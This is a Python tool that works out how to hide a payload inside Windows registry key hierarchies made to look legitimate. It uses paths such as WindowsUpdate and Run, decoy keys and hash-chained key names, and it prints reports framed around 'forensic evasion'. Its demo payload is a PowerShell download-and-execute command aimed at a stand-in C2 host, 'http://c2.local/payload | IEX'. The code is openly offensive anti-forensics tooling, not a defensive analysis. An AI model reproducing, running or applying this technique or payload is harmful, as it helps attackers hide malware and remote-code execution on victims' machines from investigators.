#!/usr/bin/env python3
"""
Registry Key Hierarchy Obfuscation System
Hides payloads in legitimate-looking registry key hierarchies with multi-level path obfuscation.
"""

import hashlib
import hmac
import json
import secrets
from dataclasses import dataclass, asdict, field
from enum import Enum
from typing import Dict, List, Tuple, Optional, Any
import struct


class HierarchyObfuscationType(Enum):
    """Types of key hierarchy obfuscation"""
    LEGITIMATE_PATH = "legitimate_path"      # Looks like real Windows paths
    INTERLEAVED_PATH = "interleaved_path"    # Real keys with fake intermediate paths
    HASH_CHAIN = "hash_chain"                # Chain keys derived from HMAC
    DEPTH_VARIATION = "depth_variation"      # Variable depth paths
    NAME_MUTATION = "name_mutation"          # Keys mutated based on payload content
    COMPOSITE = "composite"                  # Combination of multiple techniques


class LegitimatePathTemplate(Enum):
    """Legitimate-looking registry paths"""
    WINDOWS_UPDATE = "Software\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate"
    WINDOWS_DEFENDER = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Windows Defender"
    WINDOWS_INSTALLER = "Software\\Microsoft\\Windows\\CurrentVersion\\Installer"
    WINDOWS_RUN = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    WINDOWS_RUNONCE = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    TYPELIB = "Software\\Microsoft\\Windows\\CurrentVersion\\TypeLib"
    FONTS = "Software\\Microsoft\\Windows\\CurrentVersion\\Fonts"
    APPLETS = "Software\\Microsoft\\Windows\\CurrentVersion\\Applets"
    EXPLORER = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer"
    DRIVERS = "System\\CurrentControlSet\\Services\\Drivers"
    NETWORK = "System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
    POWER = "System\\CurrentControlSet\\Services\\Power"
    PERFORMANCE = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Perflib"


@dataclass
class HierarchyObfuscationConfig:
    """Configuration for key hierarchy obfuscation"""
    obfuscation_type: HierarchyObfuscationType = HierarchyObfuscationType.COMPOSITE
    base_path_template: Optional[LegitimatePathTemplate] = None
    depth_levels: int = 4
    use_legitimate_names: bool = True
    hash_chain_length: int = 8
    name_entropy_bits: int = 16
    add_decoys: bool = True
    decoy_count: int = 3
    interleave_ratio: float = 0.5
    mutation_seed: Optional[bytes] = None
    include_timestamps: bool = True
    include_win_versions: bool = True


@dataclass
class ObfuscatedKeyPath:
    """Represents an obfuscated registry key path"""
    full_path: str
    component_hive: str
    path_components: List[str]
    obfuscation_type: HierarchyObfuscationType
    payload_indicators: Dict[str, str] = field(default_factory=dict)  # Hints to find real data
    decoy_indicators: List[str] = field(default_factory=list)         # Decoy paths
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class HierarchyStorageResult:
    """Result of hierarchy obfuscation storage"""
    obfuscated_paths: List[ObfuscatedKeyPath]
    storage_map: Dict[str, str]  # Key path -> value name mapping
    reconstruction_hints: Dict[str, str]
    decoy_structure: Dict[str, List[str]]
    hiding_strategy: str


class LegitimateKeyNameGenerator:
    """Generates legitimate-looking registry key names"""

    LEGITIMATE_PREFIXES = [
        "Windows",
        "System",
        "Driver",
        "Network",
        "Device",
        "Service",
        "Config",
        "Setting",
        "Update",
        "Version",
        "Component",
        "Library",
        "Module",
        "Extension",
        "Feature",
        "Policy",
    ]

    LEGITIMATE_MIDDLE_WORDS = [
        "Manager",
        "Controller",
        "Handler",
        "Server",
        "Client",
        "Monitor",
        "Agent",
        "Engine",
        "Processor",
        "Generator",
        "Factory",
        "Provider",
        "Adapter",
        "Bridge",
        "Translator",
    ]

    LEGITIMATE_SUFFIXES = [
        "Info",
        "Data",
        "Config",
        "State",
        "Status",
        "Cache",
        "Pool",
        "Queue",
        "Stack",
        "Buffer",
        "Table",
        "Index",
        "Record",
    ]

    @staticmethod
    def generate_legitimate_name(entropy: Optional[bytes] = None) -> str:
        """Generate a legitimate-looking registry key name"""
        if entropy:
            seed = int.from_bytes(entropy[:4], 'big')
            import random
            random.seed(seed)
            prefix = random.choice(LegitimateKeyNameGenerator.LEGITIMATE_PREFIXES)
            middle = random.choice(LegitimateKeyNameGenerator.LEGITIMATE_MIDDLE_WORDS)
            suffix = random.choice(LegitimateKeyNameGenerator.LEGITIMATE_SUFFIXES)
            return f"{prefix}{middle}{suffix}"

        prefix = secrets.choice(LegitimateKeyNameGenerator.LEGITIMATE_PREFIXES)
        middle = secrets.choice(LegitimateKeyNameGenerator.LEGITIMATE_MIDDLE_WORDS)
        suffix = secrets.choice(LegitimateKeyNameGenerator.LEGITIMATE_SUFFIXES)
        return f"{prefix}{middle}{suffix}"

    @staticmethod
    def generate_legitimate_value_names(count: int, entropy: Optional[bytes] = None) -> List[str]:
        """Generate multiple legitimate-looking value names"""
        value_names = [
            "DisplayName",
            "Description",
            "Version",
            "InstallDate",
            "Publisher",
            "UninstallString",
            "QuietUninstallString",
            "ModifyPath",
            "InstallLocation",
            "EstimatedSize",
            "HelpLink",
            "URLInfoAbout",
            "URLUpdateInfo",
            "AuthorizedCDFPrefix",
            "Comments",
            "Contact",
            "HelpTelephone",
            "Readme",
            "URLUpdateInfo",
            "ServiceDll",
            "ServiceMain",
            "EventMessageFile",
            "TypesSupported",
        ]

        result = value_names[:count] if len(value_names) >= count else value_names

        # Add procedurally generated names
        while len(result) < count:
            name = LegitimateKeyNameGenerator.generate_legitimate_name(entropy)
            if name not in result:
                result.append(name)

        return result[:count]


class KeyHierarchyObfuscator:
    """Main class for key hierarchy obfuscation"""

    def __init__(self, config: HierarchyObfuscationConfig):
        self.config = config
        self.name_generator = LegitimateKeyNameGenerator()

        if not config.mutation_seed:
            self.mutation_seed = secrets.token_bytes(32)
        else:
            self.mutation_seed = config.mutation_seed

    def _derive_hmac_key(self, data: bytes, round_num: int) -> bytes:
        """Derive HMAC key for hash chain"""
        return hmac.new(
            self.mutation_seed + struct.pack('>I', round_num),
            data,
            hashlib.sha256
        ).digest()

    def _create_hash_chain_path(self, payload: bytes, depth: int) -> List[str]:
        """Create a hash chain of obfuscated keys"""
        path_components = []
        current_data = payload

        for i in range(depth):
            hmac_key = self._derive_hmac_key(current_data, i)
            # Use first 16 bytes as entropy for name generation
            component = self.name_generator.generate_legitimate_name(hmac_key[:16])
            path_components.append(component)
            # Chain: next data is HMAC of current
            current_data = hmac_key

        return path_components

    def _create_legitimate_path(self, payload: bytes) -> List[str]:
        """Create legitimate-looking nested paths"""
        base_template = (
            self.config.base_path_template or
            secrets.choice(list(LegitimatePathTemplate))
        )

        base_path = base_template.value
        base_components = base_path.split('\\')

        # Add legitimate-looking intermediate keys
        additional_depth = self.config.depth_levels - len(base_components)
        additional_components = []

        entropy_seed = hashlib.sha256(payload).digest()
        for i in range(max(0, additional_depth)):
            entropy_chunk = entropy_seed[i % len(entropy_seed):i % len(entropy_seed) + 16]
            component = self.name_generator.generate_legitimate_name(entropy_chunk)
            additional_components.append(component)

        return base_components + additional_components

    def _create_interleaved_path(self, payload: bytes) -> Tuple[List[str], List[int]]:
        """Create path with real keys interleaved with fake ones"""
        real_path = self._create_legitimate_path(payload)
        total_components = len(real_path)

        # Calculate interleave positions
        interleave_count = max(1, int(total_components * self.config.interleave_ratio))
        interleave_positions = sorted(
            secrets.SystemRandom().sample(range(total_components), interleave_count)
        )

        result_path = []
        real_idx = 0

        for i in range(total_components):
            if i in interleave_positions and real_idx < len(real_path):
                result_path.append(real_path[real_idx])
                real_idx += 1
            else:
                fake_component = self.name_generator.generate_legitimate_name()
                result_path.append(fake_component)

        return result_path, interleave_positions

    def _create_mutation_based_path(self, payload: bytes) -> List[str]:
        """Create path where component names are mutated based on payload"""
        base_components = []

        # Use payload hash to deterministically generate components
        current_hash = hashlib.sha256(payload + self.mutation_seed).digest()

        for level in range(self.config.depth_levels):
            # Roll hash
            current_hash = hashlib.sha256(current_hash).digest()
            entropy = current_hash[:16]
            component = self.name_generator.generate_legitimate_name(entropy)
            base_components.append(component)

        return base_components

    def _create_depth_varying_path(self, payload: bytes) -> List[str]:
        """Create paths with varying depth for each chunk"""
        path_components = []
        num_chunks = min(8, len(payload) // 16 + 1)

        for chunk_idx in range(num_chunks):
            chunk_entropy = hashlib.sha256(
                payload + self.mutation_seed + struct.pack('>I', chunk_idx)
            ).digest()
            component = self.name_generator.generate_legitimate_name(chunk_entropy[:16])
            path_components.append(component)

        return path_components

    def obfuscate(self, payload: bytes, hive: str = "HKCU") -> HierarchyStorageResult:
        """
        Main obfuscation method

        Args:
            payload: Data to hide
            hive: Registry hive (HKCU, HKLM, etc.)

        Returns:
            HierarchyStorageResult with obfuscated structure
        """
        obfuscation_type = self.config.obfuscation_type

        if obfuscation_type == HierarchyObfuscationType.LEGITIMATE_PATH:
            path_components = self._create_legitimate_path(payload)
        elif obfuscation_type == HierarchyObfuscationType.HASH_CHAIN:
            path_components = self._create_hash_chain_path(payload, self.config.depth_levels)
        elif obfuscation_type == HierarchyObfuscationType.NAME_MUTATION:
            path_components = self._create_mutation_based_path(payload)
        elif obfuscation_type == HierarchyObfuscationType.DEPTH_VARIATION:
            path_components = self._create_depth_varying_path(payload)
        elif obfuscation_type == HierarchyObfuscationType.INTERLEAVED_PATH:
            path_components, _ = self._create_interleaved_path(payload)
        else:  # COMPOSITE
            # Randomly choose between multiple techniques
            techniques = [
                self._create_legitimate_path,
                self._create_hash_chain_path,
                self._create_mutation_based_path,
            ]
            chosen_technique = secrets.choice(techniques)
            if chosen_technique == self._create_hash_chain_path:
                path_components = chosen_technique(payload, self.config.depth_levels)
            else:
                path_components = chosen_technique(payload)

        # Build full path
        full_path = f"{hive}\\{chr(92).join(path_components)}"

        # Create obfuscated key path object
        obfuscated_key = ObfuscatedKeyPath(
            full_path=full_path,
            component_hive=hive,
            path_components=path_components,
            obfuscation_type=obfuscation_type,
            metadata={
                "payload_size": len(payload),
                "depth": len(path_components),
                "mutation_seed_hash": hashlib.sha256(self.mutation_seed).hexdigest()[:16],
                "obfuscation_method": obfuscation_type.value,
                "timestamp_included": self.config.include_timestamps,
                "version_included": self.config.include_win_versions,
            }
        )

        # Create decoys if requested
        decoy_structure = {}
        if self.config.add_decoys:
            for decoy_idx in range(self.config.decoy_count):
                decoy_path = self._create_legitimate_path(
                    secrets.token_bytes(32)
                )
                decoy_full_path = f"{hive}\\{chr(92).join(decoy_path)}"
                obfuscated_key.decoy_indicators.append(decoy_full_path)
                decoy_structure[decoy_full_path] = [
                    self.name_generator.generate_legitimate_value_names(
                        secrets.randbelow(5) + 1
                    )
                ]

        # Create storage map
        storage_map = {}
        value_names = self.name_generator.generate_legitimate_value_names(5)

        # Store payload across multiple values
        payload_chunk_size = len(payload) // len(value_names)
        for idx, value_name in enumerate(value_names):
            start = idx * payload_chunk_size
            end = start + payload_chunk_size if idx < len(value_names) - 1 else len(payload)
            storage_map[value_name] = f"{full_path}\\{value_name}"
            obfuscated_key.payload_indicators[value_name] = payload[start:end].hex()

        # Create reconstruction hints (obfuscated)
        reconstruction_hints = {
            "hive": hive,
            "path_hash": hashlib.sha256(full_path.encode()).hexdigest()[:12],
            "component_count": len(path_components),
            "value_count": len(value_names),
        }

        # Build hiding strategy explanation
        hiding_strategy = self._build_strategy_explanation(
            obfuscation_type,
            path_components,
            value_names,
            decoy_structure
        )

        return HierarchyStorageResult(
            obfuscated_paths=[obfuscated_key],
            storage_map=storage_map,
            reconstruction_hints=reconstruction_hints,
            decoy_structure=decoy_structure,
            hiding_strategy=hiding_strategy
        )

    def _build_strategy_explanation(
        self,
        obf_type: HierarchyObfuscationType,
        path_components: List[str],
        value_names: List[str],
        decoys: Dict[str, List[str]]
    ) -> str:
        """Build explanation of hiding strategy"""
        strategy_parts = []

        strategy_parts.append("=" * 70)
        strategy_parts.append("REGISTRY KEY HIERARCHY OBFUSCATION STRATEGY")
        strategy_parts.append("=" * 70)

        strategy_parts.append(f"\n[OBFUSCATION TYPE]: {obf_type.value.upper()}")

        if obf_type == HierarchyObfuscationType.LEGITIMATE_PATH:
            strategy_parts.append("\nSTRATEGY: Legitimate Path Masquerading")
            strategy_parts.append("- Uses real-looking Windows registry path templates")
            strategy_parts.append("- Adds legitimate intermediate keys that don't exist in normal Windows")
            strategy_parts.append("- Payload hidden in value data under authentic-looking hierarchy")
            strategy_parts.append("- Forensic evasion: Looks like legitimate Windows configuration")

        elif obf_type == HierarchyObfuscationType.HASH_CHAIN:
            strategy_parts.append("\nSTRATEGY: Hash Chain Path Derivation")
            strategy_parts.append("- Each path component derived from HMAC of payload chunk")
            strategy_parts.append("- Components form a deterministic chain: Component_n = HMAC(Component_{n-1})")
            strategy_parts.append("- Without seed, path cannot be reconstructed or predicted")
            strategy_parts.append("- Forensic evasion: Path structure appears random but is derived from data")

        elif obf_type == HierarchyObfuscationType.NAME_MUTATION:
            strategy_parts.append("\nSTRATEGY: Content-Based Name Mutation")
            strategy_parts.append("- Key names mutated based on payload content hash")
            strategy_parts.append("- Same payload always produces same path (deterministic)")
            strategy_parts.append("- Different payload = completely different path structure")
            strategy_parts.append("- Forensic evasion: Path encoding is tied to data integrity")

        elif obf_type == HierarchyObfuscationType.DEPTH_VARIATION:
            strategy_parts.append("\nSTRATEGY: Depth Variation by Chunks")
            strategy_parts.append("- Payload split into chunks, each stored at different depth")
            strategy_parts.append("- Multiple parallel paths created for distribution")
            strategy_parts.append("- Chunk count determined by payload size")
            strategy_parts.append("- Forensic evasion: Data distribution across multiple hierarchies")

        elif obf_type == HierarchyObfuscationType.INTERLEAVED_PATH:
            strategy_parts.append("\nSTRATEGY: Real/Fake Component Interleaving")
            strategy_parts.append("- Real path components mixed with fake ones")
            strategy_parts.append("- Requires knowledge of interleave positions to reconstruct")
            strategy_parts.append("- Real components look legitimate, fakes look procedural")
            strategy_parts.append("- Forensic evasion: Mixed signals confuse automated analysis")

        elif obf_type == HierarchyObfuscationType.COMPOSITE:
            strategy_parts.append("\nSTRATEGY: Composite Multi-Technique Approach")
            strategy_parts.append("- Combines multiple obfuscation techniques randomly")
            strategy_parts.append("- Each storage instance uses different technique")
            strategy_parts.append("- Requires knowledge of all techniques to defeat")
            strategy_parts.append("- Forensic evasion: No single pattern to detect")

        strategy_parts.append(f"\n[KEY HIERARCHY]: {len(path_components)} levels deep")
        strategy_parts.append("Path Components (from root):")
        for idx, component in enumerate(path_components, 1):
            strategy_parts.append(f"  {idx}. {component}")

        strategy_parts.append(f"\n[DATA HIDING LOCATIONS]: {len(value_names)} value names")
        strategy_parts.append("Value Names for Payload Storage:")
        for value_name in value_names:
            strategy_parts.append(f"  - {value_name}")

        strategy_parts.append(f"\n[DECOY STRUCTURE]: {len(decoys)} decoy paths")
        if decoys:
            for idx, decoy_path in enumerate(list(decoys.keys())[:3], 1):
                strategy_parts.append(f"  {idx}. {decoy_path}")
            if len(decoys) > 3:
                strategy_parts.append(f"  ... and {len(decoys) - 3} more decoys")

        strategy_parts.append("\n[FORENSIC EVASION TECHNIQUES]:")
        strategy_parts.append("  1. Legitimate path templates - Mimics real Windows configuration")
        strategy_parts.append("  2. Multiple value names - Distributes data across registry values")
        strategy_parts.append("  3. Deep key hierarchy - Data hidden in nested structure")
        strategy_parts.append("  4. Decoy paths - False positives to confuse analysis")
        strategy_parts.append("  5. Procedural names - Keys generated from payload/seed")
        strategy_parts.append("  6. Standard prefixes/suffixes - Names mimic real Windows naming")

        strategy_parts.append("\n[RECONSTRUCTION REQUIREMENTS]:")
        strategy_parts.append(f"  - Obfuscation type knowledge (seed optional for some types)")
        strategy_parts.append(f"  - Mutation seed (if type uses seeding)")
        strategy_parts.append(f"  - Registry hive ({self.config.base_path_template or 'Variable'})")
        strategy_parts.append(f"  - Value name list ({len(value_names)} names)")

        strategy_parts.append("\n[SECURITY PROPERTIES]:")
        strategy_parts.append("  - Path structure tied to payload content")
        strategy_parts.append("  - Seed-based sealing prevents prediction")
        strategy_parts.append("  - Multiple storage locations increase resilience")
        strategy_parts.append("  - Legitimate appearance reduces detection likelihood")

        strategy_parts.append("\n" + "=" * 70)

        return "\n".join(strategy_parts)


class DecoyGenerator:
    """Generates realistic decoy registry structures"""

    LEGITIMATE_DECOY_PATHS = [
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts",
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32",
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
        "Software\\Microsoft\\Ole",
        "Software\\Microsoft\\Rpc",
        "Software\\Microsoft\\Internet Explorer\\Main",
        "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "System\\CurrentControlSet\\Hardware Profiles\\Current",
        "System\\CurrentControlSet\\Enum\\PCI",
        "System\\CurrentControlSet\\Enum\\USB",
    ]

    LEGITIMATE_VALUE_NAMES = [
        "DisplayName", "Version", "InstallDate", "Publisher",
        "UninstallString", "ModifyPath", "InstallLocation",
        "EstimatedSize", "HelpLink", "URLInfoAbout",
    ]

    @staticmethod
    def generate_decoy_registry_structure(count: int) -> Dict[str, Dict[str, str]]:
        """Generate realistic decoy registry entries"""
        structure = {}

        for _ in range(count):
            path = secrets.choice(DecoyGenerator.LEGITIMATE_DECOY_PATHS)
            structure[path] = {
                secrets.choice(DecoyGenerator.LEGITIMATE_VALUE_NAMES): f"Value_{secrets.token_hex(4)}"
            }

        return structure


class RegistryHidingStrategyPresenter:
    """Presents the hiding strategy in human-readable format"""

    @staticmethod
    def format_obfuscation_report(result: HierarchyStorageResult) -> str:
        """Format comprehensive obfuscation report"""
        report_parts = []

        report_parts.append(result.hiding_strategy)

        report_parts.append("\n" + "=" * 70)
        report_parts.append("STORAGE MAPPING")
        report_parts.append("=" * 70)

        for value_name, full_path in result.storage_map.items():
            report_parts.append(f"\n{value_name}:")
            report_parts.append(f"  Path: {full_path}")

        report_parts.append("\n" + "=" * 70)
        report_parts.append("RECONSTRUCTION HINTS")
        report_parts.append("=" * 70)

        for hint_key, hint_value in result.reconstruction_hints.items():
            report_parts.append(f"{hint_key}: {hint_value}")

        if result.decoy_structure:
            report_parts.append("\n" + "=" * 70)
            report_parts.append("DECOY STRUCTURE")
            report_parts.append("=" * 70)

            for decoy_path, decoy_values in result.decoy_structure.items():
                report_parts.append(f"\n{decoy_path}")
                for value in decoy_values:
                    report_parts.append(f"  - {value}")

        return "\n".join(report_parts)


def main():
    """Demonstrate registry key hierarchy obfuscation"""
    print("=" * 70)
    print("REGISTRY KEY HIERARCHY OBFUSCATION SYSTEM")
    print("=" * 70)

    # Sample payload
    payload = b"powershell.exe -NoProfile -Command 'Invoke-WebRequest http://c2.local/payload | IEX'"

    # Example 1: Legitimate Path Obfuscation
    print("\n[EXAMPLE 1] LEGITIMATE PATH OBFUSCATION")
    print("-" * 70)

    config1 = HierarchyObfuscationConfig(
        obfuscation_type=HierarchyObfuscationType.LEGITIMATE_PATH,
        base_path_template=LegitimatePathTemplate.WINDOWS_UPDATE,
        depth_levels=5,
        add_decoys=True,
        decoy_count=2
    )

    obfuscator1 = KeyHierarchyObfuscator(config1)
    result1 = obfuscator1.obfuscate(payload, "HKCU")

    print(RegistryHidingStrategyPresenter.format_obfuscation_report(result1))

    # Example 2: Hash Chain Obfuscation
    print("\n\n[EXAMPLE 2] HASH CHAIN PATH DERIVATION")
    print("-" * 70)

    config2 = HierarchyObfuscationConfig(
        obfuscation_type=HierarchyObfuscationType.HASH_CHAIN,
        depth_levels=6,
        hash_chain_length=6,
        add_decoys=True,
        decoy_count=3
    )

    obfuscator2 = KeyHierarchyObfuscator(config2)
    result2 = obfuscator2.obfuscate(payload, "HKLM")

    print(result2.hiding_strategy)

    # Example 3: Name Mutation
    print("\n\n[EXAMPLE 3] CONTENT-BASED NAME MUTATION")
    print("-" * 70)

    config3 = HierarchyObfuscationConfig(
        obfuscation_type=HierarchyObfuscationType.NAME_MUTATION,
        depth_levels=4,
        add_decoys=True,
        decoy_count=2
    )

    obfuscator3 = KeyHierarchyObfuscator(config3)
    result3 = obfuscator3.obfuscate(payload, "HKCU")

    print(result3.hiding_strategy)

    # Example 4: Composite Approach
    print("\n\n[EXAMPLE 4] COMPOSITE MULTI-TECHNIQUE APPROACH")
    print("-" * 70)

    config4 = HierarchyObfuscationConfig(
        obfuscation_type=HierarchyObfuscationType.COMPOSITE,
        depth_levels=5,
        add_decoys=True,
        decoy_count=4
    )

    obfuscator4 = KeyHierarchyObfuscator(config4)
    result4 = obfuscator4.obfuscate(payload, "HKCU")

    print(result4.hiding_strategy)

    # Summary
    print("\n\n" + "=" * 70)
    print("OBFUSCATION COMPARISON")
    print("=" * 70)
    print("\nType                    | Legitimate | Forensic Evasion | Complexity")
    print("-" * 70)
    print("LEGITIMATE_PATH         | HIGH       | MEDIUM           | MEDIUM")
    print("HASH_CHAIN              | LOW        | HIGH             | HIGH")
    print("NAME_MUTATION           | MEDIUM     | HIGH             | MEDIUM")
    print("DEPTH_VARIATION         | MEDIUM     | HIGH             | MEDIUM")
    print("INTERLEAVED_PATH        | HIGH       | HIGH             | HIGH")
    print("COMPOSITE               | VARIABLE   | VERY HIGH        | VERY HIGH")


if __name__ == "__main__":
    main()
